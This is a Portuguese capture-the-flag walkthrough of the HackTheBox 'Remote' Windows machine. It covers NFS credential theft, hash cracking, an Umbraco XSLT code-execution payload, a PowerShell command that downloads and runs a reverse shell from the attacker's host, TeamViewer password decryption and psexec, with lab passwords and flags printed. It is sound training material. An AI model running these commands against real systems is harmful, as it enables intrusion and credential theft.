---
title: "Remote - HackTheBox"
date: 2024-01-06
published: true
lang: pt-BR
translation_key: "remote-htb"
original_url: /remote-htb
permalink: /pt-br/remote-htb
---
# [](#intro)Introdução

Neste CTF, vamos explorar um sistema Windows. Através de um reconhecimento bem feito, seremos capazes de encontrar credenciais divulgadas, obter uma concha reversa e, em seguida, aumentar os nossos privilégios dentro da máquina. Você pode acessar esta máquina [here](https://app.hackthebox.com/machines/234).

Vamos dar uma vista de olhos!


# [](#level-description)Challenge description

A descrição do desafio é:

> Informações da máquina
>
> Remoto é uma máquina Windows de fácil dificuldade que possui uma instalação CMS Umbraco. As credenciais são encontradas em um compartilhamento NFS legível no mundo. Usando estes, uma exploração autenticada da Umbraco CMS é aproveitada para ganhar uma posição. Uma versão vulnerável do TeamViewer é identificada, da qual podemos obter uma senha. Esta senha foi reutilizada com a conta de administrador local. Usando `psexec` com estas credenciais retorna uma shell SISTEMA.

O desafio basicamente nos deu todas as rotas para fazer uma boa pesquisa e reconhecimento minucioso. Precisamos encontrar as credenciais para entrar no CMS Umbraco, onde teremos uma exploração (provavelmente um CVE) que nos dará uma concha. A partir daí, exploramos outro CVE, mas agora para o TeamViewer, para obter a senha do aministrador. Finalmente, temos o shell SISTEMA usando `psexec` do impacket.

# [](#approach)Aproxime-se da mentalidade

Vamos separar isto em:

1. Reconhecimento
2. Obtendo apoio
3. Escalando privilégios
4. Bandeiras

Mas primeiro, vamos fazer nosso próprio reconhecimento como nosso passo 1.

# # [](#mindset-step0)Passo 1 - Reconhecimento

A primeira coisa que devemos fazer, é executar `nmap` para ver quais serviços e portas estão abertos. Vamos começar com um nmap simples:

```bash
kaizen@celestial /tmp/htb/ $ nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A 10.129.229.68
# Nmap 7.94 scan initiated Sat Jan  6 10:36:32 2024 as: nmap -p- -T4 --min-rate 1000 -oN ports.nmap -A 10.129.229.68
Nmap scan report for 10.129.229.68
Host is up (0.29s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp   open  rpcbind?
| rpcinfo: 
|   program version    port/proto  service
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
2049/tcp  open  mountd        1-3 (RPC #100005)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49679/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/6%OT=21%CT=1%CU=34700%PV=Y%DS=2%DC=T%G=Y%TM=65992EB7
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=FB%GCD=1%ISR=10E%TI=I%CI=I%II=I%SS=S%TS=U)
OS:SEQ(SP=FB%GCD=1%ISR=10E%TI=I%CI=RD%II=I%SS=S%TS=U)OPS(O1=M53ANW8NNS%O2=M
OS:53ANW8NNS%O3=M53ANW8%O4=M53ANW8NNS%O5=M53ANW8NNS%O6=M53ANNS)WIN(W1=FFFF%
OS:W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M53AN
OS:W8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=
OS:0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T
OS:4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+
OS:%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y
OS:%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%
OS:RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-01-06T13:40:44
|_  start_date: N/A
|_clock-skew: 3h01m32s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 587/tcp)
HOP RTT       ADDRESS
1   258.93 ms 10.10.16.1
2   128.65 ms 10.129.229.68

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  6 10:43:03 2024 -- 1 IP address (1 host up) scanned in 390.87 seconds
```
A partir disso, podemos ver algumas informações interessantes. Vamos falar de cada um deles.

Porto 21

Nmap nos mostrou que a porta FTP 21 está aberta e o login anônimo está habilitado. Vamos dar uma olhadela.

```bash
kaizen@celestial ~/CTFs/htb/machines/Remote $ ftp 10.129.229.68
Connected to 10.129.229.68.
220 Microsoft FTP Service
Name (10.129.229.68:kaizen): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
257 "/" is current directory.
```
Como podemos ver, não há nada no sistema de arquivos FTP.

Porto 80

Na porta 80, temos o serviço web.

<img src="../figs/remote-htb1.png" alt="Remote webservice homepage">

Em alguns cliques aqui e ali, acabamos na página de login:

<img src="../figs/remote-htb2.png" alt="login page">

A partir da descrição da máquina, precisamos fazer login no CMS Umbraco para explorar a vulnerabilidade, então estamos presos aqui. Vamos para os próximos portos interessantes.

Portos 139, 445

Estes estão relacionados com SMB. Tentei enumerar estes manualmente, mas não com sucesso. Parece que é apenas para usuários autenticados. Vamos para a porta NFS.

Porto 2049

De acordo com a descrição da máquina, as credenciais para o CMS Umbraco estão em algum lugar no compartilhamento NFS. Vamos usar o `showmount` para listar as ações públicas disponíveis:

```bash
(.pyvenv) kaizen@celestial /tmp/htb $ showmount -e 10.129.229.68
Export list for 10.129.229.68:
/site_backups (everyone)
```
Assim, somos capazes de nos conectar ao compartilhamento `/site_backups`. Pelo seu nome, parece ser os arquivos de backup que fazem o site funcionar. Para conectar, precisamos criar um ponto de montagem primeiro com `mkdir -p /tmp/mnt`, por exemplo. Usando [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/nfs-service-pentesting), encontramos o comando para se conectar ao compartilhamento NFS:

```bash
(.pyvenv) kaizen@celestial /tmp/htb $ sudo mount -t nfs -o vers=3,nolock $IP:/site_backups /tmp/mnt/
(.pyvenv) kaizen@celestial /tmp/htb $ cd /tmp/mnt
(.pyvenv) kaizen@celestial /tmp/mnt $ ls
App_Browsers  App_Plugins    bin     css           Global.asax  scripts  Umbraco_Client  Web.config
App_Data      aspnet_client  Config  default.aspx  Media        Umbraco  Views
```
Após uma rápida pesquisa de onde a Umbraco armazena senhas, encontramos [esta publicação ](https://stackoverflow.com/questions/36979794/umbraco-database-connection-credentials) stackoverflow. Vemos que está dentro do arquivo `App_Data/Umbraco.sdf`:

```bash
(.pyvenv) kaizen@celestial /tmp/mnt $ find . -name Umbraco.sdf -type f
./App_Data/Umbraco.sdf
```
Se tentarmos catá-lo, veremos que parece um arquivo binário: ilegível. Vamos tentar criar para `password`, `passwordhash` e `hash`. A última busca produz:

<img src="../figs/remote-htb3.png" alt="password-hash">

Mostrar o hash de senha é `b8be16afba8c314ad33d812f22a04991b90e2aaa` e usa hash SHA1. Também podemos ver que o e-mail do administrador é `admin@htb.local`.

Podemos usar John, o Estripador para quebrar este haxixe:

```bash
(.pyvenv) kaizen@celestial /tmp/htb $ john --format:RAW-SHA1 --wordlist:/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA1 [SHA1 128/128 AVX 4x])
No password hashes left to crack (see FAQ)
(.pyvenv) kaizen@celestial /tmp/htb $ john --show hash.txt 
?:baconandcheese

1 password hash cracked, 0 left
```
# # De volta ao site...

Agora que temos as credenciais `admin@htb.local:baconandcheese`, vamos tentar entrar:

<img src="../figs/remote-htb4.png" alt="logged in webpage">

E estamos no site! Note que a versão Umbraco utilizada é 7.12.4. Agora, é hora de encontrar uma façanha para isso online. Uma pesquisa rápida no Google `umbraco 7.12.4 exploit` leva a [esta exploração ](https://www.exploit-db.com/exploits/49488). A partir do código, parece fazer uma solicitação POST para o endpoint `/umbraco/backoffice/UmbracoApi/Authentication/PostLogin` com esta carga útil:

```python
payload = """\
<?xml version="1.0"?><xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:csharp_user="http://csharp.mycompany.com/mynamespace"><msxsl:script language="C#" implements-prefix="csharp_user">public string xml() { string cmd = "%s"; System.Diagnostics.Process proc = new System.Diagnostics.Process(); proc.StartInfo.FileName = "%s"; proc.StartInfo.Arguments = cmd; proc.StartInfo.UseShellExecute = false; proc.StartInfo.RedirectStandardOutput = true;  proc.Start(); string output = proc.StandardOutput.ReadToEnd(); return output; }  </msxsl:script><xsl:template match="/"> <xsl:value-of select="csharp_user:xml()"/> </xsl:template> </xsl:stylesheet>\
""" % (args.arguments, args.command)
```
Pelo que entendi, essa carga parece ser um arquivo XML que usa XSLT com código C# embutido. XSLT é uma linguagem usada para transformar documentos XML em outros formatos. A carga útil é estruturada para não apenas executar uma transformação, mas também executar código C# dentro do contexto de um processador XSLT que suporta a extensão msxsl:script.

O código C# incorporado aqui é usado para executar código arbitrário passado pelos switches `-c` e `-a`. A exploração tem uma linha que diz:

```python
#usage python exploit.py -u admin@example.org -p password123 -i 'http://10.0.0.1' -c ipconfig
```
Vamos testá-lo!

```bash
(.pyvenv) kaizen@celestial /tmp/htb $ python exploit.py -u admin@htb.local -p baconandcheese -i http://10.129.14.142 -c ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::8a
   IPv6 Address. . . . . . . . . . . : dead:beef::d5a:847:7d7c:ae55
   Link-local IPv6 Address . . . . . : fe80::d5a:847:7d7c:ae55%12
   IPv4 Address. . . . . . . . . . . : 10.129.14.142
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:2bb5%12
                                       10.129.0.1
```
Incrível! Nós somos capazes de executar o lado de servidor de código arbitrário. Agora, temos de pensar numa maneira de gerar uma concha reversa.

## [](#mindset-step2)Passo 2 - Obtendo apoio

Após uma longa pesquisa, acabei com este script powershell de [Nishang](https://github.com/samratashok/nishang#anti-virus). Como podemos ver, podemos gerar uma shell reversa se o windows executar o seguinte comando:

```powershell
powershell -c iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
```
Assim, uma maneira que poderíamos tentar acessar o shell inverso é executando o exploit como este:

```bash
python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.14.142' -c 'cmd.exe' -a "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444"
```
Para que isso funcione, precisamos executar um servidor Python onde nosso script `Invoke-PowerShellTcp.ps1` é, e também executar `nc -lnvp 4444` para receber o shell.

```bash
kaizen@celestial /tmp/htb $ sudo python3 -m http.server 80
[sudo] password for root: 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```
em seguida, em outra aba:

```bash
kaizen@celestial /tmp/htb $ nc -lnvp 4444
```
E, finalmente, fazemos a façanha:

```bash
(.pyvenv) kaizen@celestial /tmp/htb $ python exploit.py -u admin@htb.local -p baconandcheese -i 'http://10.129.14.142' -c 'cmd.exe' -a "/c powershell -c iex(new-object net.webclient).downloadstring('http://10.10.16.14/Invoke-PowerShellTcp.ps1');;Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.14 -Port 4444"
```
No nosso netcat, temos uma ligação.

```bash
kaizen@celestial /tmp/htb $ nc -lnvp 4444
Connection from 10.129.14.142:49693
Windows PowerShell running as user REMOTE$ on REMOTE
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami
iis apppool\defaultapppool
```
Como podemos ver, não somos root, mas temos acesso ao sistema. Vamos pensar numa forma de aumentar os privilégios.


# # [](#mindset-step3)Passo 3 - Privilégios de escalada

Primeiro precisamos saber para onde o TeamViewer está a correr. Para isso, podemos correr:

```bash
PS C:\windows\system32\inetsrv> tasklist /svc
[...snip...]
svchost.exe                   2200 W3SVC, WAS                                  
vmtoolsd.exe                  2208 VMTools                                     
TeamViewer_Service.exe        2216 TeamViewer7                                 
svchost.exe                   2236 W32Time                                     
MsMpEng.exe                   2244 WinDefend     
[...snip...]
```
Agora, vamos dar uma olhada nos CVEs em relação ao TeamViewer7. Depois de pesquisar através de lotes de diferentes CVEs, parece que é [este](https://www.cvedetails.com/cve/CVE-2019-18988/) um. Resumindo, temos:

> TeamViewer Desktop através de 14.7.1965 permite um bypass de controle de acesso de login remoto porque a mesma chave é usada para diferentes instalações de clientes. Usou uma chave AES compartilhada para todas as instalações desde pelo menos até v7.0.43148, e usou-a para pelo menos OpçõesPasswordAES na versão atual do produto. Se um atacante conhecesse esta chave, eles poderiam descriptografar informações armazenadas no registro ou arquivos de configuração do TeamViewer. Com versões anteriores ao v9.x , isso permitiu que os atacantes descriptografassem a senha de acesso não habilitado para o sistema (que permite login remoto para o sistema, bem como navegação de arquivos sem cabeça). A versão mais recente ainda usa a mesma chave para o OptionPasswordAES, mas parece ter alterado a forma como a senha de acesso não vigiado é armazenada. Enquanto na maioria dos casos um atacante requer uma sessão existente em um sistema, se as chaves de registro/configuração foram armazenadas fora da máquina (como em um compartilhamento de arquivo ou on-line), um atacante poderia então descriptografar a senha necessária para entrar no sistema.

Basicamente, TeamViewer7 usa um algoritmo de criptografia fraco que pode ser rachado. Depois de mais uma pesquisa, encontrei [este](https://github.com/mr-r3b00t/CVE-2019-18988) O GitHub recupera a exploração. De alguma forma, precisamos de o colocar dentro da máquina CTF. Para fazer isso, salve a exploração em nossa máquina local, abra um servidor Python. Na máquina host, vamos `cd C:\windows\temp\` e então:

```bash
PS C:\windows\temp> Invoke-WebRequest -Uri 'http://10.10.16.14/exploit.bat' -OutFile 'C:\windows\temp\exploit.bat'
PS C:\windows\temp> ls exploit.bat


    Directory: C:\windows\temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----         1/6/2024  11:56 PM           1148 exploit.bat 
```
Para executar o exploit, digitamos `.\exploit.bat`:

```bash
PS C:\windows\temp> .\exploit.bat

C:\windows\temp>REM # CVE-2019-18988 

C:\windows\temp>REM # Teamviewer Local Privesc 

C:\windows\temp>REM https://community.teamviewer.com/t5/Announcements/Specification-on-CVE-2019-18988/td-p/82264 

C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v Version 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    Version    REG_SZ    7.0.43148


C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B0A059
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x64c273d8
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\AccessControl
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\DefaultSettings

C:\windows\temp>reg query HKLM\SOFTWARE\TeamViewer\Temp /v SecurityPasswordExported 

C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7
    StartMenuGroup    REG_SZ    TeamViewer 7
    InstallationDate    REG_SZ    2020-02-20
    InstallationDirectory    REG_SZ    C:\Program Files (x86)\TeamViewer\Version7
    Always_Online    REG_DWORD    0x1
    Security_ActivateDirectIn    REG_DWORD    0x0
    Version    REG_SZ    7.0.43148
    ClientIC    REG_DWORD    0x11f25831
    PK    REG_BINARY    BFAD2AEDB6C89AE0A0FD0501A0C5B9A5C0D957A4CC57C1884C84B6873EA03C069CF06195829821E28DFC2AAD372665339488DD1A8C85CDA8B19D0A5A2958D86476D82CA0F2128395673BA5A39F2B875B060D4D52BE75DB2B6C91EDB28E90DF7F2F3FBE6D95A07488AE934CC01DB8311176AEC7AC367AB4332ABD048DBFC2EF5E9ECC1333FC5F5B9E2A13D4F22E90EE509E5D7AF4935B8538BE4A606AB06FE8CC657930A24A71D1E30AE2188E0E0214C8F58CD2D5B43A52549F0730376DD3AE1DB66D1E0EBB0CF1CB0AA7F133148D1B5459C95A24DDEE43A76623759017F21A1BC8AFCD1F56FD0CABB340C9B99EE3828577371B7ADA9A8F967A32ADF6CF062B00026C66F8061D5CFF89A53EAE510620BC822BC6CC615D4DE093BC0CA8F5785131B75010EE5F9B6C228E650CA89697D07E51DBA40BF6FC3B2F2E30BF6F1C01F1BC2386FA226FFFA2BE25AE33FA16A2699A1124D9133F18B50F4DB6EDA2D23C2B949D6D2995229BC03507A62FCDAD55741B29084BD9B176CFAEDAAA9D48CBAF2C192A0875EC748478E51156CCDD143152125AE7D05177083F406703ED44DCACCD48400DD88A568520930BED69FCD672B15CD3646F8621BBC35391EAADBEDD04758EE8FC887BACE6D8B59F61A5783D884DBE362E2AC6EAC0671B6B5116345043257C537D27A8346530F8B7F5E0EBACE9B840E716197D4A0C3D68CFD2126E8245B01E62B4CE597AA3E2074C8AB1A4583B04DBB13F13EB54E64B850742A8E3E8C2FAC0B9B0CF28D71DD41F67C773A19D7B1A2D0A257A4D42FC6214AB870710D5E841CBAFCD05EF13B372F36BF7601F55D98ED054ED0F321AEBA5F91D390FF0E8E5815E6272BA4ABB3C85CF4A8B07851903F73317C0BC77FA12A194BB75999319222516
    SK    REG_BINARY    F82398387864348BAD0DBB41812782B1C0ABB9DAEEF15BC5C3609B2C5652BED7A9A07EA41B3E7CB583A107D39AFFF5E06DF1A06649C07DF4F65BD89DE84289D0F2CBF6B8E92E7B2901782BE8A039F2903552C98437E47E16F75F99C07750AEED8CFC7CD859AE94EC6233B662526D977FFB95DD5EB32D88A4B8B90EC1F8D118A7C6D28F6B5691EB4F9F6E07B6FE306292377ACE83B14BF815C186B7B74FFF9469CA712C13F221460AC6F3A7C5A89FD7C79FF306CEEBEF6DE06D6301D5FD9AB797D08862B9B7D75B38FB34EF82C77C8ADC378B65D9ED77B42C1F4CB1B11E7E7FB2D78180F40C96C1328970DA0E90CDEF3D4B79E08430E546228C000996D846A8489F61FE07B9A71E7FB3C3F811BB68FDDF829A7C0535BA130F04D9C7C09B621F4F48CD85EA97EF3D79A88257D0283BF2B78C5B3D4BBA4307D2F38D3A4D56A2706EDAB80A7CE20E21099E27481C847B49F8E91E53F83356323DDB09E97F45C6D103CF04693106F63AD8A58C004FC69EF8C506C553149D038191781E539A9E4E830579BCB4AD551385D1C9E4126569DD96AE6F97A81420919EE15CF125C1216C71A2263D1BE468E4B07418DE874F9E801DA2054AD64BE1947BE9580D7F0E3C138EE554A9749C4D0B3725904A95AEBD9DACCB6E0C568BFA25EE5649C31551F268B1F2EC039173B7912D6D58AA47D01D9E1B95E3427836A14F71F26E350B908889A95120195CC4FD68E7140AA8BB20E211D15C0963110878AAB530590EE68BF68B42D8EEEB2AE3B8DEC0558032CFE22D692FF5937E1A02C1250D507BDE0F51A546FE98FCED1E7F9DBA3281F1A298D66359C7571D29B24D1456C8074BA570D4D0BA2C3696A8A9547125FFD10FBF662E597A014E0772948F6C5F9F7D0179656EAC2F0C7F
    LastMACUsed    REG_MULTI_SZ    \0005056B0A059
    MIDInitiativeGUID    REG_SZ    {514ed376-a4ee-4507-a28b-484604ed0ba0}
    MIDVersion    REG_DWORD    0x1
    ClientID    REG_DWORD    0x6972e4aa
    CUse    REG_DWORD    0x1
    LastUpdateCheck    REG_DWORD    0x64c273d8
    UsageEnvironmentBackup    REG_DWORD    0x1
    SecurityPasswordAES    REG_BINARY    FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B
    MultiPwdMgmtIDs    REG_MULTI_SZ    admin
    MultiPwdMgmtPWDs    REG_MULTI_SZ    357BC4C8F33160682B01AE2D1C987C3FE2BAE09455B94A1919C4CD4984593A77
    Security_PasswordStrength    REG_DWORD    0x3

HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\AccessControl
HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\TeamViewer\Version7\DefaultSettings

C:\windows\temp>reg query HKLM\SOFTWARE\TeamViewer\Version7 

C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v SecurityPasswordExported 



C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v ServerPasswordAES  



C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v ProxyPasswordAES 



C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v LicenseKeyAES 



C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v OptionsPassword 



C:\windows\temp>reg query HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7 /v PermanentPassword 



C:\windows\temp>REM CYBERCHEF RECIPE  

C:\windows\temp>REM AES_Decrypt({'option':'Hex','string':'0602000000a400005253413100040000'},{'option':'Hex','string':'0100010067244F436E6762F25EA8D704'},'CBC','Hex','Raw',{'option':'Hex','string':''})Decode_text('UTF-16LE (1200)') 
PS C:\windows\temp> The system was unable to find the specified registry key or value.
```
A partir desta enorme saída, encontramos três coisas: primeiro, a senha HEX criptografada é `FF9B1C73D66BCE31AC413EAE131B464F582F6CE2D1E1F3DA7E8D376B26394E5B`. Segundo, temos a chave de criptografia AES, que é `0602000000a400005253413100040000`. Finalmente, temos o IV, que é `0100010067244F436E6762F25EA8D704`. Podemos ir para [Cyberchef](https://gchq.github.io) e selecionar AES descriptografar receita. Aqui está o resultado:

<img src="../figs/remote-htb5.png" alt="cyberchef decrypt AES">

Mostrar a senha de administrador é `!R3m0te!`.

## [](#mindset-step4)Passo 4 - Resolvendo!

Agora que temos a senha do administrador, podemos usar o `psexec.py`, como declarado pela informação da máquina, para obter o shell do SISTEMA. Para isso, nós simplesmente corremos:

```bash
kaizen@celestial ~ $ psexec.py 'administrator:!R3m0te!@10.129.14.142'
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.129.14.142.....
[*] Found writable share ADMIN$
[*] Uploading file lAgjnpRc.exe
[*] Opening SVCManager on 10.129.14.142.....
[*] Creating service eGkl on 10.129.14.142.....
[*] Starting service eGkl.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```
E pronto! Temos a nossa cápsula do sistema! Agora, recuperamos todas as bandeiras.

```bash
C:\Windows\system32> type c:\users\public\user.txt
aa3d4bb0861760843cb76a9d9f92190a

C:\Windows\system32> type c:\users\administrator\desktop\root.txt
a033160985b82a79d7188f9c1974a8fc
```
# [](#conclusions)Conclusão

Nesta CTF, aprendemos um pouco mais Vulnerabilidades Comuns: uma sobre CMS Umbraco desatualizados; e a outra, uma CVE que recupera hasses de senha do TeamViewer que mais tarde podem ser usadas para obter o shell do SYSTEM. Nada muito chique, mas muito atencioso!

